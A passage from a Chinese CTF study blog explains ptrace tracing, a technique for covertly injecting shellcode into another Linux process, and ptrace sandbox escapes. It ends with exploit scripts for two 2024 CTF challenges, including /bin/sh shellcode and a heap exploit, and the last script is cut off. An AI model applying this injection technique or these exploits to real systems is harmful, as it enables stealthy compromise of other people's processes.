orig_rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*ORIG_RAX,NULL);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(orig_rax != <span class="number">1</span>)&#123;</span><br><span class="line">ptrace(PTRACE_SYSCALL,child,NULL,NULL);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(<span class="string">&quot;Got signal %d\n&quot;</span>,WSTOPSIG(status));</span><br><span class="line">/*Syscall entry*/</span><br><span class="line"><span class="keyword">if</span>(insyscall==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">insyscall=<span class="number">1</span>;</span><br><span class="line">params[<span class="number">0</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDI,NULL);</span><br><span class="line">params[<span class="number">1</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RSI,NULL);</span><br><span class="line">params[<span class="number">2</span>]=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RDX,NULL);</span><br><span class="line">printf(<span class="string">&quot;write called with %ld,%ld,%ld\n&quot;</span>,params[<span class="number">0</span>],params[<span class="number">1</span>],params[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">rax=ptrace(PTRACE_PEEKUSER,child,<span class="number">8</span>*RAX,NULL);</span><br><span class="line">printf(<span class="string">&quot;Write returned with %ld\n&quot;</span>,rax);</span><br><span class="line">insyscall=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            ptrace(PTRACE_SYSCALL, child, NULL, NULL);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果，这里只放出一部分代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">10</span></span><br><span class="line">total 64K</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">10</span></span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">write called <span class="keyword">with</span> <span class="number">1</span>,<span class="number">95611630020928</span>,<span class="number">46</span></span><br><span class="line">drwxrwxr-x  <span class="number">4</span> qwq qwq <span class="number">4.0</span>K  <span class="number">3</span>月  <span class="number">1</span>  <span class="number">2024</span> buu</span><br><span class="line">Got signal <span class="number">133</span></span><br><span class="line">Write returned <span class="keyword">with</span> <span class="number">46</span></span><br></pre></td></tr></table></figure><h2 id="1-7-进程栈与进程堆-线程栈和线程堆"><a href="#1-7-进程栈与进程堆-线程栈和线程堆" class="headerlink" title="1.7 进程栈与进程堆 线程栈和线程堆"></a>1.7 进程栈与进程堆 线程栈和线程堆</h2><p>前面我们提到了进程的四要素</p><ol><li>要执行的程序</li><li>专用的系统堆栈空间（代码段数据段等）</li><li>task_struct和pid</li><li>独立的存储空间</li></ol><p>  缺少第四条的称为线程，如果完全没有用户空间称为内核线程，共享用户空间的称为用户线</p><p>接下来我们来了解进程栈和线程栈</p><hr><p><strong>进程栈</strong>：<strong>程序被操作系统加载并执行时，会为其分配一块内存作为进程的地址空间，这其中包括进程栈。</strong>进程栈存储所有线程共享的全局变量之外等等数据。比如局部变量，函数参数和返回地址。每个进程是独立的，所以进程栈也是相互独立的。</p><p><strong>线程栈：每个线程共享所属进程的地址空间，但是有自己的线程栈</strong>。线程栈同样存储局部变量，函数参数和返回地址。它们是线程私有的，每个线程的栈空间互不影响。</p><p><strong>进程栈服务于整个进程，而线程栈服务于进程内的每一个线程。</strong></p><h1 id="0X2-ptrace的shellcode注入"><a href="#0X2-ptrace的shellcode注入" class="headerlink" title="0X2 ptrace的shellcode注入"></a>0X2 ptrace的shellcode注入</h1><h2 id="2-1-相关原理"><a href="#2-1-相关原理" class="headerlink" title="2.1 相关原理"></a>2.1 相关原理</h2><p>参考：<a href="https://www.freebuf.com/articles/system/350514.html">一种Linux下ptrace隐藏注入shellcode技术和防御方法 - FreeBuf网络安全行业门户</a></p><p>不同版本操作系统有各自实现ptrace系统调用的方式，由于本文只关注Linux环境。我们通常用ptrace提供的系统调用 通过一个进程去控制另一个进程，这常被用于程序调试、分析和监测工具，例如gdb和strace等。</p><p>控制进程tracer和被控制进程tracee</p><p>一个tracee只能关联（attach）一个tracer，一个tracer可以关联多个tracee，实际上linux下tracee只是一个线程，一个包含多个线程的进程中每个线程可以单独关联各自的tracer。</p><p>如果tracer要控制tracee可以进行下图的对应操作。</p><p><img src="E:\blog_images\1726049231841-1a5c4bdc-96e3-4ed7-9886-a2bdb6dc14b6.jpeg" alt="img"></p><ol><li>tracer调用PTRACE_ATTACH功能关联指定的tracee，向tracee发送SIGSTOP信号，并调用waitpid等待tracee状态改变；</li><li>当tracee状态变成STOP，waitpid返回；</li><li>tracer调用PTRACE_SYSCALL功能让tracee进入单步执行状态，并调用waitpid等待tracee状态改变；</li><li>重复步骤2)和步骤3)；</li><li>tracer调用PTRACE_DETACH功能让tracee恢复运行，并解除关联。</li></ol><p>步骤3)中tracer可以检查和修改tracee的内存和寄存器内容，给渗透攻击注入shellcode提供了可能，接下来描述利用ptrace隐藏注入shellcode的技术细节。</p><h2 id="2-2-技术解析"><a href="#2-2-技术解析" class="headerlink" title="2.2 技术解析"></a>2.2 技术解析</h2><p>达成隐藏注入shellcode的目标需要解决三个问题：</p><ol><li>shellcode存放在哪里？</li><li>如何执行shellcode？</li><li>如何不被轻易发现正在运行的shellcode？</li></ol><h3 id="2-2-1-shellcode存放在哪里"><a href="#2-2-1-shellcode存放在哪里" class="headerlink" title="2.2.1 shellcode存放在哪里"></a>2.2.1 shellcode存放在哪里</h3><p>shellcode存放涉及到读取和写入的问题，而且存放的段还要有可执行权限（即具有rwxp权限的段），所以一般存放在mmap分配出来的内存。</p><p>所以要实现shellcode存放，父进程函数执行流得如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH,tracee_pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">waitpid(tracee_pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">mem_addr=remote_mmap(tracee_pid,<span class="literal">NULL</span>,<span class="number">4096</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">poke_text(tracee_pid,(<span class="type">size_t</span>)mem_addr,shellcode,SHELL_LEN);</span><br></pre></td></tr></table></figure><p>如何在子进程的内存中写入shellcode？自己的猜想</p><p>第一 子进程和父进程共享内存，那么我们可以在父进程先写入shellcode</p><p>第二 不共享内存，则有没有修改子进程内存的函数或者文件？</p><p>文件的话&#x2F;proc&#x2F;pid&#x2F;mem可以修改内存</p><h3 id="2-2-2-如何执行shellcode"><a href="#2-2-2-如何执行shellcode" class="headerlink" title="2.2.2 如何执行shellcode"></a>2.2.2 如何执行shellcode</h3><p>我们控制的是父进程的函数执行流，对于子进程我们需要通过父进程修改rip寄存器来达到修改shellcode的效果。伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取tracee寄存器并备份</span></span><br><span class="line"><span class="comment">//reg是struct user_regs_struct类型变量，上面有提到过</span></span><br><span class="line">ptrace(PTRACE_GETREGS,tracee_pid,<span class="literal">NULL</span>,&amp;reg);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;old_regs,&amp;regs,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_regs_struct));</span><br><span class="line"><span class="comment">//修改rip为mem_addr (shellcode的地址)</span></span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">regs.rip += <span class="number">2</span>;<span class="comment">//+=2的意义何在？</span></span><br><span class="line"><span class="comment">//设置tracee寄存器</span></span><br><span class="line">ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line"><span class="comment">//执行shellcode，假设shellcode结尾执行了getpid系统调用，就是用它结尾的意思</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  ptrace(PTRACE_SYSCALL, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line">  waitpid(tracee_pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  ptrace(PTRACE_GETREGS, tracee_pid, <span class="number">0</span>, &amp;regs)</span><br><span class="line">  <span class="keyword">if</span> (regs.orig_rax == <span class="number">39</span>) &#123;</span><br><span class="line">    <span class="comment">// 已执行getpid系统调用，恢复tracee状态</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, tracee_pid, <span class="literal">NULL</span>, &amp;old_regs)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 恢复tracee运行</span></span><br><span class="line">ptrace(PTRACE_DETACH, tracee_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><p>但是上述代码只是在tracee进程（线程）中执行了一次shellcode，还达不到隐藏注入的目的。</p><h3 id="2-2-3-隐藏shellcode执行"><a href="#2-2-3-隐藏shellcode执行" class="headerlink" title="2.2.3 隐藏shellcode执行"></a>2.2.3 隐藏shellcode执行</h3><p>一个简单的解决方法是在tracee所在进程中新建一个线程，在新建的线程中执行shellcode，并在shellcode中加入可以持续运行的循环。（如何理解？）</p><p>这时，通过监测进程状态难以发现注入的shellcode；如果tracee所在进程原来就包含多个线程，通过监测线程状态也难以准确判断是否被注入了shellcode；虽然检查tracee进程的内存段可以找到具有执行权限的匿名内存段，但是有些进程本来就存在具有执行权限的匿名内存段，仍然不能准确判断是否存在shellcode。综上所述，这种新建线程中执行shellcode的方式能够解决第三个问题：如何不被轻易发现正在运行的shellcode。伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置新建线程的栈</span></span><br><span class="line">stack_addr = remote_mmap(tracee_pid, <span class="literal">NULL</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>)</span><br><span class="line">stack_top = stack_addr + <span class="number">4096</span></span><br><span class="line">poke_text(tracee_pid, (<span class="type">size_t</span>)stack_addr, (<span class="type">char</span> *)&amp;mem_addr, <span class="keyword">sizeof</span>(<span class="type">void</span> *))</span><br><span class="line"><span class="comment">// 修改系统调用为SYS_clone并单步执行，新建线程以后恢复执行原有代码</span></span><br><span class="line">thread_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top)</span><br><span class="line"><span class="comment">// 在新建的线程中执行shellcode</span></span><br><span class="line">ptrace(PTRACE_GETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">regs.rip = (<span class="type">u_int64_t</span>) mem_addr;</span><br><span class="line">ptrace(PTRACE_SETREGS, thread_pid, <span class="literal">NULL</span>, &amp;regs)</span><br><span class="line">ptrace(PTRACE_DETACH, thread_pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure><h2 id="2-3-对应的防御措施"><a href="#2-3-对应的防御措施" class="headerlink" title="2.3 对应的防御措施"></a>2.3 对应的防御措施</h2><p>Linux内核使用图4描述的算法检查调用者（caller）相对目标（target）的ptrace访问权限。首先检查调用者和目标是否在同一个线程组，是则允许（allowed）使用ptrace功能；接着根据调用者和目标的用户编号（uid）和组编号（gid）是否一致、目标是否有可转存（dumpable）属性、调用方是否具有CAP_SYS_PTRACE权限，判定是否拒绝（denied）使用ptrace功能；然后调用Linux安全模块（LSM），例如：SELinux、Yama、Smack等，不同的安全模块有各自的检查判定规则；最后如果之前的检查没有拒绝使用ptrace功能，则允许使用。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726108227781-e82be599-1ad7-4755-839b-734eb69d8d50.jpeg" alt="img"></p><h2 id="2-4-能够进行的绕过"><a href="#2-4-能够进行的绕过" class="headerlink" title="2.4 能够进行的绕过"></a>2.4 能够进行的绕过</h2><p>参考：<a href="https://qianfei11.github.io/MyOldBlog/2020/04/18/Linux-Sandbox-Ptrace/#Escape-by-Fork">Linux Sandbox - Ptrace - B3ale (qianfei11.github.io)</a></p><h3 id="2-4-1-Escape-by-fork"><a href="#2-4-1-Escape-by-fork" class="headerlink" title="2.4.1 Escape by fork"></a>2.4.1 Escape by fork</h3><ul><li><p>只要 ptrace 没有跟踪好 fork、vfork、clone，子进程就不会被 ptrace 跟踪；</p></li><li><p>正确的做法是要继续跟好子进程，或者直接禁止 fork。</p></li><li><ul><li>可以设置 <code>PTRACE_O_TRACECLONE</code> 选项，会自动跟踪 clone 出来的新进程。</li></ul></li></ul><h3 id="2-4-2-Escape-by-Kill"><a href="#2-4-2-Escape-by-Kill" class="headerlink" title="2.4.2 Escape by Kill"></a>2.4.2 Escape by Kill</h3><ul><li><p>杀死父进程；</p></li><li><ul><li><code>kill(getppid(), 9);</code>；</li><li>ppid 无法获取时可以尝试 pid-1；</li><li><code>/proc/self/stat</code> 中可以拿到 pid 和 ppid；</li><li><code>kill(-1, 9);</code> 杀死除了自己以外的所有进程。</li></ul></li><li><p>设置 <code>PTRACE_O_EXITKILL</code> 可以让 Tracer 结束时把所有的 Tracee 杀死。</p></li></ul><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>fork ptrace wait函数这些进程相关的函数</p><p>这里考点比较零碎，主要考基础知识，基础知识得自己去查去学</p><p>如fork爆破canary等</p><p>wait等的是ptrace的状态，所以我们可以用空的ptrace调用绕过wait的状态检查</p><p>例题就是2024nepctf</p><h2 id="2024nepctf-NepBOX"><a href="#2024nepctf-NepBOX" class="headerlink" title="2024nepctf NepBOX"></a>2024nepctf NepBOX</h2><p>自制沙盒，好像考点也不难。</p><p>主要是看沙盒给了什么函数，从上面的函数下手就可以了。</p><p>后面想到wait出来的参数是根据ptrace来的，只要我提前ptrace一个空进程，就能绕过很多东西wait状态的检查，只能说学到了很多进程的东西。</p><p>然后虽然说没有read函数的功能，但是题目给出了一个打印read函数参数的功能，就利用这个功能区leak。</p><p>要注意rsi为rsp才能leak上面的内容，因为指针的关系，这里%p只是打印寄存器的值，然而pop rsi，自然打印出来rsp上面的值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;neptune-49685.nepctf.lemonprefect.cn&#x27;</span>,<span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="literal">True</span>, typ=<span class="string">&quot;tcp&quot;</span>)</span><br><span class="line"></span><br><span class="line">opennat=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov r15,rdx</span></span><br><span class="line"><span class="string">mov rax,101</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,0x67616c662f2e  </span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi,rsp </span></span><br><span class="line"><span class="string">mov rsi,0 </span></span><br><span class="line"><span class="string">mov rdx,0 </span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,r15</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rax,101</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rsp,r15</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">short_shellcode=<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">shellcodeQWQ=[shellcode1,shellcode2,shellcode3]</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *(rebase +0x1a14)&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;do what you feel is right!&quot;</span>)</span><br><span class="line">p.send(opennat)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后打印出来的东西就是flag的大端小端反写，之后就是找工具转译了。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1724511366296-7019bbcc-9ce3-46b8-bea3-c939ba7f99f9.png" alt="img"></p><h2 id="2024-YCB-hard-seccomp"><a href="#2024-YCB-hard-seccomp" class="headerlink" title="2024 YCB hard-seccomp"></a>2024 YCB hard-seccomp</h2><p>参考：<a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/userspace-api/seccomp_filter.html">Seccomp BPF (基于过滤器的安全计算) — The Linux Kernel documentation</a></p><p>参考：[羊城杯 2024 pwn writeup (qanux.github.io)](<a href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF">https://qanux.github.io/2024/08/28/羊城杯</a> 2024 pwn writeup&#x2F;index.html)</p><p>参考：<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/ptrace.2.html">PTRACE - Linux手册页-之路教程 (onitroad.com)</a></p><p>题目是一个简单堆题，这里house of cat进行了控制程序流，到我们可以写入shellcode到执行shellcode的脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;49.234.30.109&quot;</span>,9999)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span><span class="params">(i)</span>:</span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;&gt;&quot;</span>,str(i))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span><span class="params">(idx,size)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Size: &quot;</span>,str(size))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span><span class="params">(idx)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">2</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span><span class="params">(idx,con)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">3</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Content: &quot;</span>,con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(idx)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">4</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line"></span><br><span class="line">libcversion=<span class="string">&quot;235&quot;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)#old1</span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;heap_addr&quot;</span>,hex(heap_addr))</span><br><span class="line">heapbase=heap_addr<span class="number">-0xcf0</span></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line"><span class="keyword">if</span> libcversion==<span class="string">&quot;236&quot;</span>:</span><br><span class="line">main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">_IO_list_all=main_arena+<span class="number">0xA00</span></span><br><span class="line">libcbase=_IO_list_all<span class="number">-0x000001f7660</span></span><br><span class="line">_IO_list_all=libcbase+<span class="number">0x01f7660</span></span><br><span class="line">openat2=libcbase+<span class="number">0x00010cb50</span></span><br><span class="line">read=libcbase+<span class="number">0x010cce0</span></span><br><span class="line">write=libcbase+<span class="number">0x0010cd80</span></span><br><span class="line">IO_wfile_jumps=libcbase+<span class="number">0x001f30a0</span></span><br><span class="line">setcontext=libcbase+<span class="number">0x041c00</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x0023b65</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x251be</span></span><br><span class="line">pop_rdx=libcbase+<span class="number">0x166262</span></span><br><span class="line">pop_rdx_rcx_rbx=libcbase+<span class="number">0x00101353</span></span><br><span class="line">pop_rbp=libcbase+<span class="number">0x023a60</span></span><br><span 